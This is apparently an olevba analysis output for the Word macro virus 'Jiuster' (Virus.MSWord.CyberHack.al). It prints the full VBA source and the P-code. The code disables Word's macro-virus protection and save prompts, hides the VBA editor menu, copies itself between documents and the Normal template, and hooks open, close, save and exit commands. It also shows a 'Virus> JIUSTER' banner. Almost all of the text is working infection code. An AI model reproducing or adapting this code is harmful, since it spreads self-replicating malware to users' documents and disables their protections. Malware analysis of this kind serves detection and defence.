olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack.al
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CyberHack.al - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Jiuster.bas 
in file: Virus.MSWord.CyberHack.al - OLE stream: 'Macros/VBA/Jiuster'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'No Modifique Nada Causaras Errores Att. Jiuster  SuperXtar@Usa.Net
'Si Quieres Aprender Contactame Via E.Mail
'Abstenerse Lamer's como tu
Public Jiustea1
Public Jiustea
Public Jiustez
Sub Seli()
    Jiustex = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Idat
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
     On Error GoTo 0
End Sub
Sub HolaIDAT()
Application.DisplayAlerts = Jiustex
End Sub
Sub Experto()
    On Error GoTo Jiu2
    Jiustea1 = 0
    Jiustez = False
    Set Ad = ActiveDocument
    Set NT = NormalTemplate
       If Jiustez = False Then
      On Error GoTo Jit2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=Ad.FullName, Name:= _
          "Jiuster", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=Ad.FullName, Name:= _
          "Jiuster4", Object:=wdOrganizerObjectProjectItems
      Jiustea1 = 1
Jit2:
    End If
Jiu2:
End Sub
Sub JiusterSoft()
    Call Idat
    On Error GoTo Jiu1
    Jiustea = False
    Set Ad = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Jit1a
    For i = 1 To NT.VBProject.VBComponents.Count
      NMacr = NT.VBProject.VBComponents(i).Name
    Next i
Jit1a:
    If Jiustea = False Then
      On Error GoTo Jit1
      Application.OrganizerCopy Source:=Ad.FullName, _
          Destination:=NT.FullName, Name:= _
          "Jiuster", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=Ad.FullName, _
          Destination:=NT.FullName, Name:= _
          "Jiuster4", Object:=wdOrganizerObjectProjectItems
      Templates(NT.FullName).Save
Jit1:
    End If
Jiu1:
End Sub
Sub LOMAXIMO()
    Call Seli
    Call JiusterSoft
    Call HolaIDAT
End Sub
Sub Idat()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Hacker()
    On Error GoTo Jit4
Set Ad = ActiveDocument
    If Jiustea1 = 1 Then
       Ad.SaveAs FileName:=Ad.Name, FileFormat:=wdFormatDocument
    End If
Jit4:
End Sub
Sub AutoOpen()
    Call LOMAXIMO
End Sub
Sub AutoClose()
    Call Seli
    Call JiusterSoft
   Call Experto
    Call HolaIDAT
    ActiveDocument.SaveAs
    Call LOMAXIMO
 End Sub
Sub FileClose()
    Call Seli
    Call JiusterSoft
    Call Experto
    Call HolaIDAT
   ActiveDocument.SaveAs
   Call LOMAXIMO
   End Sub
Sub FileOpen()
    Call LOMAXIMO
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    Dialogs(wdDialogFileOpen).Show
    Call Seli
    Call Experto
    Call Hacker
    Call HolaIDAT
End Sub
Sub FileSaveAs()
    Call Seli
    Call JiusterSoft
    Call Experto
    Call HolaIDAT
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub HelpAbout()
    On Error GoTo Jiu3
      Jiuster4.Show
Jiu3:
Call LOMAXIMO
End Sub

Sub HerramMacro()
    On Error GoTo Jiu3
    Jiuster4.Show
Application.OnTime Now + TimeValue("00:30:00"), "JiusVisual"
Jiu3:
    Call LOMAXIMO
End Sub

Sub FileExit()
    Call Seli
    Call JiusterSoft
    Call Experto
    On Error GoTo Jiu4
    If WeekDay(Date) = 5 Then Jiuster4.Show
Jiu4:
    Call HolaIDAT
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call LOMAXIMO
End Sub
Sub FileNew()
    Call LOMAXIMO
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
On Error Resume Next
Call LOMAXIMO
End Sub
Sub ToolsCustomize()
On Error Resume Next
Call LOMAXIMO
End Sub
Sub ToolsCustomizeKeyboard()
    Call LOMAXIMO
End Sub
Sub ViewVBCode()
Jiuster4.Show
    Call LOMAXIMO
End Sub
Sub Organizer()
End Sub
Public Sub JiusVisual()
On Error Resume Next
Documents.Add
ActiveDocument.Background.Fill.ForeColor.RGB = RGB(0, 0, 0)
    ActiveDocument.Background.Fill.Visible = msoTrue
    ActiveDocument.Background.Fill.Solid
    ActiveWindow.View.Type = wdOnlineView
    With Selection.Font
        .Name = "Arial Black"
        .Size = 25
        .Bold = True
        .ColorIndex = wdRed
       End With
    Selection.TypeText Text:="THE ANGEL GABRIELL"
    Selection.MoveLeft Unit:=wdCharacter, Count:=8, Extend:=wdExtend
    With Selection.Font
        .Name = "Arial Black"
        .Size = 30
        .Bold = True
        .ColorIndex = wdRed
        .Animation = wdAnimationBlinkingBackground
    End With
    Selection.EndKey Unit:=wdLine
    With Selection.Font
        .Name = "Arial Black"
        .Size = 30
        .Bold = True
        .ColorIndex = wdBlue
        .Animation = wdAnimationNone
    End With
    Selection.Font.Size = 20
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.Font.Size = 25
    Selection.TypeText Text:="TU SUEÑO SE HIZO REALIDAD"
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.Font.Size = 30
    With Selection.Font
        .Name = "Arial Black"
        .Size = 35
        .Bold = True
        .ColorIndex = wdWhite
        .Animation = wdAnimationNone
    End With
    Selection.TypeText Text:="Virus> JIUSTER"
       Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.Font.Size = 25
     With Selection.Font
        .Name = "Arial Black"
        .Size = 30
        .Bold = True
        .ColorIndex = wdYellow
        .Animation = wdAnimationNone
    End With
    Selection.TypeText Text:="GABRIELL>  ;-), :-D"
    Selection.Font.Size = 20
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:="The Angel Gabriell >J.O.N.    E.Mail:  SUPERXTAR@USA.NET"
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:="El CiberSpace Es El FireWall Que Me Divide De Lo Real"
      ActiveDocument.SaveAs
End Sub


-------------------------------------------------------------------------------
VBA MACRO Jiuster4.frm 
in file: Virus.MSWord.CyberHack.al - OLE stream: 'Macros/VBA/Jiuster4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 















































'No Modifique Nada Causaras Errores Att. Jiuster SuperXtar@Usa.Net
'Si Quieres Aprender Contactame Via E.Mail
'Abstenerse Lamer's como tu
Dim Jter As Integer
Private Sub Seli()
      If Jter = 0 Then
        Idat.Picture = Idat1.Picture
        Jter = 1
    Else
        Idat.Picture = Idat2.Picture
        Jter = 0
    End If
End Sub
Private Sub IeTimer1_Timer()
Seli
End Sub
Private Sub IeTimer2_Timer()
    IeTimer2.Tag = Mid(IeTimer2.Tag, 2) + Left(IeTimer2.Tag, 1)
            Jiuster4.Caption = IeTimer2.Tag
        BackColor = &HFFFFFF * Rnd
End Sub
Private Sub IeTimer3_Timer()
        IeTimer3.Tag = Mid(IeTimer3.Tag, 2) + Left(IeTimer3.Tag, 1)
            Jiuster3.Caption = IeTimer3.Tag
End Sub
Private Sub Jiuster2_Click()
Unload Me
End Sub
Private Sub Jiuster1_Click()
On Error Resume Next
        Dim retval
            retval = Shell("C:\windows\Sol.EXE", 1)
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.CyberHack.al
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1122 bytes
' Macros/VBA/Jiuster - 10592 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0042 "No Modifique Nada Causaras Errores Att. Jiuster  SuperXtar@Usa.Net"
' Line #1:
' 	QuoteRem 0x0000 0x0029 "Si Quieres Aprender Contactame Via E.Mail"
' Line #2:
' 	QuoteRem 0x0000 0x001A "Abstenerse Lamer's como tu"
' Line #3:
' 	Dim (Public) 
' 	VarDefn Jiustea1
' Line #4:
' 	Dim (Public) 
' 	VarDefn Jiustea
' Line #5:
' 	Dim (Public) 
' 	VarDefn Jiustez
' Line #6:
' 	FuncDefn (Sub Seli())
' Line #7:
' 	Ld Application 
' 	MemLd DisplayAlerts 
' 	St Jiustex 
' Line #8:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #9:
' 	ArgsCall (Call) Idat 0x0000 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #11:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #12:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #13:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #14:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #15:
' 	OnError (GoTo 0) 
' Line #16:
' 	EndSub 
' Line #17:
' 	FuncDefn (Sub HolaIDAT())
' Line #18:
' 	Ld Jiustex 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #19:
' 	EndSub 
' Line #20:
' 	FuncDefn (Sub Experto())
' Line #21:
' 	OnError Jiu2 
' Line #22:
' 	LitDI2 0x0000 
' 	St Jiustea1 
' Line #23:
' 	LitVarSpecial (False)
' 	St Jiustez 
' Line #24:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Ad 
' Line #25:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #26:
' 	Ld Jiustez 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #27:
' 	OnError Jit2 
' Line #28:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Ad 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Jiuster"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #29:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Ad 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Jiuster4"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #30:
' 	LitDI2 0x0001 
' 	St Jiustea1 
' Line #31:
' 	Label Jit2 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Label Jiu2 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub JiusterSoft())
' Line #36:
' 	ArgsCall (Call) Idat 0x0000 
' Line #37:
' 	OnError Jiu1 
' Line #38:
' 	LitVarSpecial (False)
' 	St Jiustea 
' Line #39:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Ad 
' Line #40:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #41:
' 	OnError Jit1a 
' Line #42:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #43:
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #44:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	Label Jit1a 
' Line #46:
' 	Ld Jiustea 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #47:
' 	OnError Jit1 
' Line #48:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld Ad 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Jiuster"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #49:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld Ad 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Jiuster4"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #50:
' 	Ld NT 
' 	MemLd FullName 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #51:
' 	Label Jit1 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Label Jiu1 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub LOMAXIMO())
' Line #56:
' 	ArgsCall (Call) Seli 0x0000 
' Line #57:
' 	ArgsCall (Call) JiusterSoft 0x0000 
' Line #58:
' 	ArgsCall (Call) HolaIDAT 0x0000 
' Line #59:
' 	EndSub 
' Line #60:
' 	FuncDefn (Sub Idat())
' Line #61:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #64:
' 	EndWith 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Sub Hacker())
' Line #67:
' 	OnError Jit4 
' Line #68:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Ad 
' Line #69:
' 	Ld Jiustea1 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #70:
' 	Ld Ad 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld Ad 
' 	ArgsMemCall SaveAs 0x0002 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	Label Jit4 
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Sub AutoOpen())
' Line #75:
' 	ArgsCall (Call) LOMAXIMO 0x0000 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Sub AutoClose())
' Line #78:
' 	ArgsCall (Call) Seli 0x0000 
' Line #79:
' 	ArgsCall (Call) JiusterSoft 0x0000 
' Line #80:
' 	ArgsCall (Call) Experto 0x0000 
' Line #81:
' 	ArgsCall (Call) HolaIDAT 0x0000 
' Line #82:
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0000 
' Line #83:
' 	ArgsCall (Call) LOMAXIMO 0x0000 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Sub FileClose())
' Line #86:
' 	ArgsCall (Call) Seli 0x0000 
' Line #87:
' 	ArgsCall (Call) JiusterSoft 0x0000 
' Line #88:
' 	ArgsCall (Call) Experto 0x0000 
' Line #89:
' 	ArgsCall (Call) HolaIDAT 0x0000 
' Line #90:
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0000 
' Line #91:
' 	ArgsCall (Call) LOMAXIMO 0x0000 
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Sub FileOpen())
' Line #94:
' 	ArgsCall (Call) LOMAXIMO 0x0000 
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #114:
' 	ArgsCall (Call) Seli 0x0000 
' Line #115:
' 	ArgsCall (Call) Experto 0x0000 
' Line #116:
' 	ArgsCall (Call) Hacker 0x0000 
' Line #117:
' 	ArgsCall (Call) HolaIDAT 0x0000 
' Line #118:
' 	EndSub 
' Line #119:
' 	FuncDefn (Sub FileSaveAs())
' Line #120:
' 	ArgsCall (Call) Seli 0x0000 
' Line #121:
' 	ArgsCall (Call) JiusterSoft 0x0000 
' Line #122:
' 	ArgsCall (Call) Experto 0x0000 
' Line #123:
' 	ArgsCall (Call) HolaIDAT 0x0000 
' Line #124:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #125:
' 	EndSub 
' Line #126:
' 	FuncDefn (Sub HelpAbout())
' Line #127:
' 	OnError Jiu3 
' Line #128:
' 	Ld Jiuster4 
' 	ArgsMemCall Show 0x0000 
' Line #129:
' 	Label Jiu3 
' Line #130:
' 	ArgsCall (Call) LOMAXIMO 0x0000 
' Line #131:
' 	EndSub 
' Line #132:
' Line #133:
' 	FuncDefn (Sub HerramMacro())
' Line #134:
' 	OnError Jiu3 
' Line #135:
' 	Ld Jiuster4 
' 	ArgsMemCall Show 0x0000 
' Line #136:
' 	Ld Now 
' 	LitStr 0x0008 "00:30:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000A "JiusVisual"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #137:
' 	Label Jiu3 
' Line #138:
' 	ArgsCall (Call) LOMAXIMO 0x0000 
' Line #139:
' 	EndSub 
' Line #140:
' Line #141:
' 	FuncDefn (Sub FileExit())
' Line #142:
' 	ArgsCall (Call) Seli 0x0000 
' Line #143:
' 	ArgsCall (Call) JiusterSoft 0x0000 
' Line #144:
' 	ArgsCall (Call) Experto 0x0000 
' Line #145:
' 	OnError Jiu4 
' Line #146:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Jiuster4 
' 	ArgsMemCall Show 0x0000 
' 	EndIf 
' Line #147:
' 	Label Jiu4 
' Line #148:
' 	ArgsCall (Call) HolaIDAT 0x0000 
' Line #149:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Sub ToolsOptions())
' Line #152:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #153:
' 	ArgsCall (Call) LOMAXIMO 0x0000 
' Line #154:
' 	EndSub 
' Line #155:
' 	FuncDefn (Sub FileNew())
' Line #156:
' 	ArgsCall (Call) LOMAXIMO 0x0000 
' Line #157:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #158:
' 	EndSub 
' Line #159:
' 	FuncDefn (Sub FileTemplates())
' Line #160:
' 	OnError (Resume Next) 
' Line #161:
' 	ArgsCall (Call) LOMAXIMO 0x0000 
' Line #162:
' 	EndSub 
' Line #163:
' 	FuncDefn (Sub ToolsCustomize())
' Line #164:
' 	OnError (Resume Next) 
' Line #165:
' 	ArgsCall (Call) LOMAXIMO 0x0000 
' Line #166:
' 	EndSub 
' Line #167:
' 	FuncDefn (Sub ToolsCustomizeKeyboard())
' Line #168:
' 	ArgsCall (Call) LOMAXIMO 0x0000 
' Line #169:
' 	EndSub 
' Line #170:
' 	FuncDefn (Sub ViewVBCode())
' Line #171:
' 	Ld Jiuster4 
' 	ArgsMemCall Show 0x0000 
' Line #172:
' 	ArgsCall (Call) LOMAXIMO 0x0000 
' Line #173:
' 	EndSub 
' Line #174:
' 	FuncDefn (Sub Organizer())
' Line #175:
' 	EndSub 
' Line #176:
' 	FuncDefn (Public Sub JiusVisual())
' Line #177:
' 	OnError (Resume Next) 
' Line #178:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #179:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #180:
' 	Ld msoTrue 
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #181:
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #182:
' 	Ld wdOnlineView 
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #183:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #184:
' 	LitStr 0x000B "Arial Black"
' 	MemStWith New 
' Line #185:
' 	LitDI2 0x0019 
' 	MemStWith Size 
' Line #186:
' 	LitVarSpecial (True)
' 	MemStWith Bold 
' Line #187:
' 	Ld wdRed 
' 	MemStWith ColorIndex 
' Line #188:
' 	EndWith 
' Line #189:
' 	LitStr 0x0012 "THE ANGEL GABRIELL"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #190:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0008 
' 	ParamNamed Count 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall MoveLeft 0x0003 
' Line #191:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #192:
' 	LitStr 0x000B "Arial Black"
' 	MemStWith New 
' Line #193:
' 	LitDI2 0x001E 
' 	MemStWith Size 
' Line #194:
' 	LitVarSpecial (True)
' 	MemStWith Bold 
' Line #195:
' 	Ld wdRed 
' 	MemStWith ColorIndex 
' Line #196:
' 	Ld wdAnimationBlinkingBackground 
' 	MemStWith Animation 
' Line #197:
' 	EndWith 
' Line #198:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #199:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #200:
' 	LitStr 0x000B "Arial Black"
' 	MemStWith New 
' Line #201:
' 	LitDI2 0x001E 
' 	MemStWith Size 
' Line #202:
' 	LitVarSpecial (True)
' 	MemStWith Bold 
' Line #203:
' 	Ld wdBlue 
' 	MemStWith ColorIndex 
' Line #204:
' 	Ld wdAnimationNone 
' 	MemStWith Animation 
' Line #205:
' 	EndWith 
' Line #206:
' 	LitDI2 0x0014 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #207:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #208:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #209:
' 	LitDI2 0x0019 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #210:
' 	LitStr 0x0019 "TU SUEÑO SE HIZO REALIDAD"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #211:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #212:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #213:
' 	LitDI2 0x001E 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #214:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #215:
' 	LitStr 0x000B "Arial Black"
' 	MemStWith New 
' Line #216:
' 	LitDI2 0x0023 
' 	MemStWith Size 
' Line #217:
' 	LitVarSpecial (True)
' 	MemStWith Bold 
' Line #218:
' 	Ld wdWhite 
' 	MemStWith ColorIndex 
' Line #219:
' 	Ld wdAnimationNone 
' 	MemStWith Animation 
' Line #220:
' 	EndWith 
' Line #221:
' 	LitStr 0x000E "Virus> JIUSTER"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #222:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #223:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #224:
' 	LitDI2 0x0019 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #225:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #226:
' 	LitStr 0x000B "Arial Black"
' 	MemStWith New 
' Line #227:
' 	LitDI2 0x001E 
' 	MemStWith Size 
' Line #228:
' 	LitVarSpecial (True)
' 	MemStWith Bold 
' Line #229:
' 	Ld wdYellow 
' 	MemStWith ColorIndex 
' Line #230:
' 	Ld wdAnimationNone 
' 	MemStWith Animation 
' Line #231:
' 	EndWith 
' Line #232:
' 	LitStr 0x0013 "GABRIELL>  ;-), :-D"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #233:
' 	LitDI2 0x0014 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #234:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #235:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #236:
' 	LitStr 0x0038 "The Angel Gabriell >J.O.N.    E.Mail:  SUPERXTAR@USA.NET"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #237:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #238:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #239:
' 	LitStr 0x0035 "El CiberSpace Es El FireWall Que Me Divide De Lo Real"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #240:
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0000 
' Line #241:
' 	EndSub 
' Line #242:
' Line #243:
' Macros/VBA/Jiuster4 - 3573 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' 	QuoteRem 0x0000 0x0041 "No Modifique Nada Causaras Errores Att. Jiuster SuperXtar@Usa.Net"
' Line #48:
' 	QuoteRem 0x0000 0x0029 "Si Quieres Aprender Contactame Via E.Mail"
' Line #49:
' 	QuoteRem 0x0000 0x001A "Abstenerse Lamer's como tu"
' Line #50:
' 	Dim 
' 	VarDefn Jter (As Integer)
' Line #51:
' 	FuncDefn (Private Sub Seli())
' Line #52:
' 	Ld Jter 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #53:
' 	Ld Idat1 
' 	MemLd Picture 
' 	Ld Idat 
' 	MemSt Picture 
' Line #54:
' 	LitDI2 0x0001 
' 	St Jter 
' Line #55:
' 	ElseBlock 
' Line #56:
' 	Ld Idat2 
' 	MemLd Picture 
' 	Ld Idat 
' 	MemSt Picture 
' Line #57:
' 	LitDI2 0x0000 
' 	St Jter 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	EndSub 
' Line #60:
' 	FuncDefn (Private Sub IeTimer1_Timer())
' Line #61:
' 	ArgsCall Seli 0x0000 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Private Sub IeTimer2_Timer())
' Line #64:
' 	Ld IeTimer2 
' 	MemLd Tag 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	Ld IeTimer2 
' 	MemLd Tag 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	Add 
' 	Ld IeTimer2 
' 	MemSt Tag 
' Line #65:
' 	Ld IeTimer2 
' 	MemLd Tag 
' 	Ld Jiuster4 
' 	MemSt Caption 
' Line #66:
' 	LitHI4 0xFFFF 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	St BackColor 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Private Sub IeTimer3_Timer())
' Line #69:
' 	Ld IeTimer3 
' 	MemLd Tag 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	Ld IeTimer3 
' 	MemLd Tag 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	Add 
' 	Ld IeTimer3 
' 	MemSt Tag 
' Line #70:
' 	Ld IeTimer3 
' 	MemLd Tag 
' 	Ld Jiuster3 
